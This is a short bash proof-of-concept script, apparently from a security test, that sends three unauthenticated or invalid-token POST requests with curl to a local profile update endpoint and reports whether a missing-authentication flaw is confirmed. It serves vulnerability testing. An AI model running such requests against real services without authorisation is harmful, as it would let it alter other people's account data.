#!/bin/bash

# POC: Missing Authentication on Profile Update Endpoint
# This script demonstrates that the profile update endpoint accepts requests without authentication

TARGET="http://localhost:3000"
echo "[*] Testing Missing Authentication on Profile Update Endpoint"
echo "[*] Target: $TARGET"
echo ""

# Test 1: POST request without any authentication
echo "[Test 1] POST request without authentication headers"
echo "Command: curl -X POST $TARGET -d \"name=Hacker&surname=McEvil&address=Evil%20HQ\""
RESPONSE1=$(curl -s -w "\n%{http_code}" -X POST "$TARGET" -d "name=Hacker&surname=McEvil&address=Evil%20HQ")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
BODY1=$(echo "$RESPONSE1" | head -n-1)
echo "HTTP Status: $HTTP_CODE1"
echo "Response: $BODY1"
echo ""

# Test 2: POST request with invalid Authorization header
echo "[Test 2] POST request with invalid Authorization token"
echo "Command: curl -X POST $TARGET -H \"Authorization: Bearer InvalidToken123\" -d \"name=Test&surname=User&address=123%20Street\""
RESPONSE2=$(curl -s -w "\n%{http_code}" -X POST "$TARGET" -H "Authorization: Bearer InvalidToken123" -d "name=Test&surname=User&address=123%20Street")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
BODY2=$(echo "$RESPONSE2" | head -n-1)
echo "HTTP Status: $HTTP_CODE2"
echo "Response: $BODY2"
echo ""

# Test 3: POST request with form data without authentication
echo "[Test 3] POST request with form data (no authentication)"
echo "Command: curl -X POST $TARGET -F \"name=AttackerName\" -F \"surname=AttackerSurname\" -F \"address=AttackerAddress\""
RESPONSE3=$(curl -s -w "\n%{http_code}" -X POST "$TARGET" -F "name=AttackerName" -F "surname=AttackerSurname" -F "address=AttackerAddress")
HTTP_CODE3=$(echo "$RESPONSE3" | tail -n1)
BODY3=$(echo "$RESPONSE3" | head -n-1)
echo "HTTP Status: $HTTP_CODE3"
echo "Response: $BODY3"
echo ""

# Analysis
echo "[*] Analysis:"
if [ "$HTTP_CODE1" = "200" ] || [ "$HTTP_CODE1" = "201" ]; then
    echo "✓ VULNERABILITY CONFIRMED: Test 1 - Unauthenticated POST request accepted (HTTP $HTTP_CODE1)"
else
    echo "✗ Test 1 rejected - Status: $HTTP_CODE1"
fi

if [ "$HTTP_CODE2" = "200" ] || [ "$HTTP_CODE2" = "201" ]; then
    echo "✓ VULNERABILITY CONFIRMED: Test 2 - Invalid token POST request accepted (HTTP $HTTP_CODE2)"
else
    echo "✗ Test 2 rejected - Status: $HTTP_CODE2"
fi

if [ "$HTTP_CODE3" = "200" ] || [ "$HTTP_CODE3" = "201" ]; then
    echo "✓ VULNERABILITY CONFIRMED: Test 3 - Form data POST request accepted (HTTP $HTTP_CODE3)"
else
    echo "✗ Test 3 rejected - Status: $HTTP_CODE3"
fi

echo ""
echo "[*] Conclusion:"
if ([ "$HTTP_CODE1" = "200" ] || [ "$HTTP_CODE1" = "201" ]) && ([ "$HTTP_CODE2" = "200" ] || [ "$HTTP_CODE2" = "201" ]); then
    echo "✓ Missing authentication vulnerability CONFIRMED"
    echo "The profile update endpoint accepts requests without proper authentication."
    exit 0
else
    echo "✗ Endpoint requires authentication or is not accessible"
    exit 1
fi